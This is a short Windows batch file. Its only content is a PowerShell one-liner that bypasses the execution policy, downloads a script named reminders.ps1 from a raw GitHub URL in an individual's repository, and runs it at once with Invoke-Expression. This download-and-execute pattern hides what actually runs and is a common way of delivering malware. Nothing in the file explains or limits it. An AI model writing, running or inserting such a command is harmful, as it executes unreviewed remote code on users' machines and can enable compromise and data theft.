@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s=(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1'); Invoke-Expression $s"
